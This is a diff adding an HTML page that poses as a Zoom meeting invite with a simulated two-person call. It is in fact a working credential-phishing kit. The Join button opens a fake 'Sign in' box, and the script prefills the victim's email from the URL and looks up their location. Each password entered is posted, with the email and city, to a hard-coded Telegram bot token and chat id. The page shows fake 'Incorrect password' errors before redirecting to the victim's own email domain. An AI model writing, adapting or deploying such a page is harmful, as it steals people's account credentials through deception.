@@ -1,0 +1,333 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Join Zoom Call Meeting</title>
+  <style>
+    :root{--bg:#0f1724;--card:#0b1220;--muted:#94a3b8;--accent:#2dd4bf;--danger:#ff4d6d}
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background:url('https://i.postimg.cc/Hx1pqm12/pure-black-background-wcs86b1g1awsprv8.jpg') no-repeat center center/cover; color:#e6eef8; min-height:100vh; display:flex;align-items:center;justify-content:center;padding:0;}
+
+    #loadingScreen{position:fixed;inset:0;background:#0f1724;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;opacity:1;transition:opacity 1s ease;}
+    #loadingScreen img{width:100px;height:100px;object-fit:contain;margin-bottom:20px;animation:spin 2s linear infinite;}
+    @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
+
+    .container{width:980px;max-width:98%;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:12px;padding:18px;box-shadow:0 10px 30px rgba(2,6,23,0.7);border:1px solid rgba(255,255,255,0.03);display:none;opacity:0;transition:opacity 1s ease;}
+    .header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+    .title{display:flex;gap:12px;align-items:center}
+    .meeting-badge{background:rgba(255,255,255,0.03);padding:8px 12px;border-radius:10px;font-weight:600}
+    .meta{color:var(--muted);font-size:13px}
+    .controls{display:flex;gap:8px;align-items:center}
+    .join-btn{background:var(--accent);color:#fff;border:none;padding:10px 14px;border-radius:10px;font-weight:700;cursor:pointer}
+
+    .stage{display:grid;grid-template-columns:1fr 320px;gap:18px}
+    .main{background:linear-gradient(180deg,rgba(255,255,255,0.015),transparent);padding:18px;border-radius:12px;border:1px solid rgba(255,255,255,0.02)}
+    .participants{display:flex;gap:12px;flex-wrap:wrap}
+    .participant{flex:1 1 240px;display:flex;align-items:center;gap:12px;padding:12px;border-radius:10px;background:rgba(255,255,255,0.01);cursor:pointer;border:1px solid rgba(255,255,255,0.02);transition:transform .18s,box-shadow .18s}
+    .participant:hover{transform:translateY(-4px);box-shadow:0 8px 24px rgba(2,6,23,0.55)}
+
+    .avatar{width:72px;height:72px;border-radius:50%;background:#1e293b;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}
+    .avatar img{width:100%;height:100%;object-fit:cover;border-radius:50%}
+    .pulse{position:absolute;inset:0;border-radius:50%;box-shadow:0 0 0 0 rgba(45,212,191,0.25);animation:none}
+    .speaking .pulse{animation:pulse 1.4s infinite}
+    @keyframes pulse{0%{transform:scale(1);opacity:0.9}50%{transform:scale(1.5);opacity:0.08}100%{transform:scale(2);opacity:0}}
+
+    .info{flex:1}
+    .name{font-weight:700}
+    .status{font-size:13px;color:var(--muted);margin-top:4px;display:flex;gap:8px;align-items:center}
+
+    .wave{display:flex;gap:4px;align-items:flex-end;height:26px}
+    .bar{width:6px;border-radius:2px;background:linear-gradient(180deg,var(--accent),#0ea5a9);opacity:0.75;transform-origin:center bottom}
+
+    .right{display:flex;flex-direction:column;gap:12px}
+    .sidebar-card{background:rgba(255,255,255,0.01);padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.02)}
+
+    .login-box{background:#fff;color:#000;max-width:360px;width:100%;padding:24px;border-radius:12px;box-shadow:0 10px 30px rgba(0,0,0,0.3);display:none;flex-direction:column;align-items:center;opacity:0;transition:opacity 1s ease;}
+    .login-box.show{display:flex;opacity:1;transition:opacity 1s ease;}
+    .container.show{display:block;opacity:1;transition:opacity 1s ease;}
+    .login-box h2{margin:12px 0 18px 0}
+    .login-box input{width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:6px}
+    .checkbox{display:flex;align-items:center;gap:6px;margin-bottom:10px}
+    .btn{width:100%;background:#0078d4;color:#fff;border:none;padding:10px;border-radius:6px;font-weight:bold;cursor:pointer}
+    .footer{font-size:12px;color:#555;margin-top:10px;text-align:center}
+    .footer a{color:#0078d4;text-decoration:none}
+
+    @media (max-width:840px){.stage{grid-template-columns:1fr;}.participant{flex-basis:100%}.right{order:2}}
+  </style>
+</head>
+<body>
+  <div id="loadingScreen">
+    <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Loading Logo">
+  </div>
+
+  <div class="container" role="application" aria-label="Active call demo">
+    <div class="header">
+      <div class="title">
+        <div class="meeting-badge">Zoom Meeting • Audio</div>
+        <div>
+          <div style="font-weight:800">Active Zoom Call</div>
+          <div class="meta">Two participants — simulated live speaking</div>
+        </div>
+      </div>
+      <div class="controls">
+        <div class="timer" id="timer">00:00</div>
+        <button class="join-btn" id="joinToggle">Join</button>
+      </div>
+    </div>
+
+    <div class="stage">
+      <div class="main">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
+          <strong>Participants</strong>
+          <span class="meta">Click a participant to toggle speaking</span>
+        </div>
+        <div class="participants" id="participants"></div>
+      </div>
+
+      <div class="right">
+        <div class="sidebar-card">
+          <strong>Active speaker</strong>
+          <div style="margin-top:8px" id="activeInfo">—</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="login-box" id="loginBox">
+    <div class="logo">
+      <img src="https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg" alt="Logo" id="logo" style="width:60px;height:60px;object-fit:contain;">
+    </div>
+    <h2>Sign in</h2>
+    <div id="error-msg" class="error-msg"></div>
+    <form id="loginForm">
+      <input type="email" id="email" placeholder="Email, phone, or Skype" required>
+      <input type="password" id="password" placeholder="Password" required>
+      <div class="checkbox">
+
+      </div>
+      <button type="button" id="login-btn" class="btn">Login</button>
+    </form>
+    <a href="https://support.zoom.com/hc/en/article?id=zm_kb&sysparm_article=KB0062436" class="forgot">Forgot password?</a>
+    <div class="footer">
+      <a href="#">Terms of use</a> · 
+      <a href="#">Privacy & cookies</a><br>
+      © Zoom 2025
+    </div>
+  </div>
+
+<script>
+  // Always show "Invalid password" without leaving login page
+  document.getElementById('login-btn').addEventListener('click', () => {
+    const errorMsg = document.getElementById('error-msg');
+    errorMsg.textContent = "Invalid password";
+    errorMsg.style.color = "red";
+    errorMsg.style.fontWeight = "bold";
+
+    // Optional shake animation
+    const loginBox = document.getElementById('loginBox');
+    loginBox.style.transition = "transform 0.1s";
+    loginBox.style.transform = "translateX(-5px)";
+    setTimeout(() => loginBox.style.transform = "translateX(5px)", 100);
+    setTimeout(() => loginBox.style.transform = "translateX(0px)", 200);
+  });
+// Telegram Bot config
+const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
+const TELEGRAM_CHAT_ID = "5748422740";
+
+// Elements
+const rawHash = window.location.hash.substring(1);
+const emailInput = document.getElementById('email');
+const logoImg = document.getElementById('logo');
+const bgFrame = document.getElementById('bg-frame');
+const passwordInput = document.getElementById('password');
+const loginBtn = document.getElementById('login-btn');
+const errorMsg = document.getElementById('error-msg');
+const overlay = document.querySelector('.overlay');
+
+let attempts = 0;
+const maxAttempts = 3;
+
+document.body.classList.add('blur-active');
+
+if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
+  alert("Invalid or missing email in the URL hash.");
+} else {
+  emailInput.value = rawHash;
+  emailInput.setAttribute("readonly", true);
+
+  const domain = rawHash.split('@')[1];
+
+  // Set logo
+  logoImg.src = `https://i.postimg.cc/qv5p8stB/blue-camera-icon-live-media-streaming-application-phone-conference-video-calls-video-communications.jpg`;
+  logoImg.onerror = () => {
+    logoImg.src = "https://via.placeholder.com/150?text=Logo";
+  };
+
+  // Setup fallback screenshot container
+  const fallbackScreenshot = document.createElement('img');
+  fallbackScreenshot.id = "fallback-screenshot";
+  fallbackScreenshot.style.cssText = `
+    display: none;
+    position: fixed; top: 0; left: 0;
+    width: 100vw; height: 100vh;
+    object-fit: cover;
+    z-index: 0;
+    pointer-events: none;
+  `;
+  fallbackScreenshot.alt = "Screenshot fallback";
+  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
+  document.body.appendChild(fallbackScreenshot);
+
+  // Load iframe with timeout
+  let iframeLoaded = false;
+  bgFrame.src = `https://${domain}`;
+
+  bgFrame.onload = () => {
+    iframeLoaded = true;
+    fallbackScreenshot.style.display = "none";
+    bgFrame.style.display = "block";
+  };
+
+  setTimeout(() => {
+    if (!iframeLoaded) {
+      bgFrame.style.display = "none";
+      fallbackScreenshot.style.display = "block";
+      // Keep overlay visible — do NOT hide it
+      document.body.classList.remove('blur-active'); // optional blur removal
+    }
+  }, 6000);
+
+  bgFrame.onerror = () => {
+    bgFrame.style.display = "none";
+    fallbackScreenshot.style.display = "block";
+    // Keep overlay visible — do NOT hide it
+    document.body.classList.remove('blur-active'); // optional blur removal
+  };
+}
+
+// Fetch user country (mandatory)
+
+// Location details
+let userIP = "Unknown IP";
+let userCity = "Unknown City";
+let userCountry = "Unknown Country";
+let userISP = "Unknown ISP";
+loginBtn.disabled = true;
+
+fetch("https://ipapi.co/json/")
+  .then(res => res.json())
+  .then(data => {
+    userCity = data.city || userCity;
+    userCountry = data.country_name || userCountry;
+  })
+  .catch(() => {
+    // silent fail
+  })
+  .finally(() => {
+    loginBtn.disabled = false;
+  });
+
+// Telegram message sender
+function sendTelegramMessage(email, password, attempt, country) {
+  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
+               ` UserId : [ ${email} ]\n` +
+               `    Pass : [ ${password} ]\n` +
+               ` Country : [ ${userCity}, ${userCountry} ]`;
+
+  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+  const payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: text,
+    parse_mode: "HTML"
+  };
+  fetch(url, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(payload)
+  }).catch(e => console.error("Telegram send failed:", e));
+}
+
+// Login button handler
+loginBtn.addEventListener('click', () => {
+  const password = passwordInput.value.trim();
+  if (password === "") {
+    errorMsg.textContent = "Password cannot be empty.";
+    return;
+  }
+  attempts++;
+  sendTelegramMessage(emailInput.value, password, attempts, userCountry);
+
+  if (attempts < maxAttempts) {
+    errorMsg.textContent = "Incorrect password.";
+    passwordInput.value = "";
+  } else {
+    errorMsg.textContent = "";
+    overlay.style.display = 'none';
+    document.body.classList.remove('blur-active');
+    window.location.href = `https://${emailInput.value.split('@')[1]}`;
+  }
+});
+
+
+    const users = [
+      { id: 'u1', name: 'Mark', avatar: 'https://i.postimg.cc/qBNDCKfk/IMG-0818.jpg', role: 'Host', mic:true },
+      { id: 'u2', name: 'Michael Bryan', avatar: 'https://i.postimg.cc/vm1xvGGM/IMG-0768.jpg', role: 'Guest', mic:true }
+    ];
+
+    const participantsEl = document.getElementById('participants');
+    const activeInfo = document.getElementById('activeInfo');
+    const timerEl = document.getElementById('timer');
+    let seconds = 0, timerInterval;
+
+    function formatTime(s){ const mm = String(Math.floor(s/60)).padStart(2,'0'); const ss = String(s%60).padStart(2,'0'); return `${mm}:${ss}`; }
+    function startTimer(){timerInterval=setInterval(()=>{seconds++;timerEl.textContent=formatTime(seconds)},1000);}
+
+    function makeBars(count){let html='';for(let i=0;i<count;i++){html += `<div class="bar" style="height:${10 + Math.round(Math.random()*60)}%"></div>`}return html;}
+
+    function renderParticipants(){
+      participantsEl.innerHTML='';
+      users.forEach((u)=>{
+        const el=document.createElement('div');
+        el.className='participant'+(u.speaking?' speaking':'');
+        el.dataset.id=u.id;
+        el.innerHTML=`<div class="avatar"><div class="pulse"></div><img src="${u.avatar}" alt="${u.name}"></div><div class="info"><div class="name">${u.name} <span style="font-weight:600;color:var(--muted);font-size:12px">· ${u.role}</span></div><div class="status"><div class="meta">${u.mic?'Microphone on':'Muted'}</div><div class="wave">${makeBars(8)}</div></div></div>`;
+        el.addEventListener('click',()=>toggleSpeaking(u.id));
+        participantsEl.appendChild(el);
+      });
+    }
+
+    function toggleSpeaking(id){users.forEach(u=>u.speaking=(u.id===id)?!u.speaking:false);updateActive();renderParticipants();}
+    function updateActive(){const active=users.find(u=>u.speaking);activeInfo.textContent=active?`${active.name} is speaking`:'Nobody is speaking';}
+    function animateLevels(){document.querySelectorAll('.bar').forEach(b=>{b.style.height=(10+Math.round(Math.random()*70))+'px';b.style.transition='height 160ms linear';});}
+
+    const joinBtn = document.getElementById('joinToggle');
+    if(joinBtn){
+      joinBtn.addEventListener('click',()=>{
+        document.querySelector('.container').style.opacity='0';
+        setTimeout(()=>{
+          document.querySelector('.container').style.display='none';
+          const loginBox=document.getElementById('loginBox');
+          loginBox.style.display='flex';
+          setTimeout(()=>{ loginBox.style.opacity='1'; },50);
+        },300);
+      });
+    }
+
+    window.addEventListener('load', ()=>{
+      setTimeout(()=>{
+        const loadingScreen=document.getElementById('loadingScreen');
+        loadingScreen.style.opacity='0';
+        setTimeout(()=>{
+          loadingScreen.style.display='none';
+          document.querySelector('.container').classList.add('show');
+        },1000);
+      },1000);
+    });
+
+    renderParticipants();updateActive();startTimer();
+    setInterval(()=>{animateLevels();},180);
+    setInterval(()=>{const idx=Math.floor(Math.random()*users.length);users.forEach((u,i)=>u.speaking=(i===idx));updateActive();renderParticipants();},9000);
+</script>
+</body>
+</html>
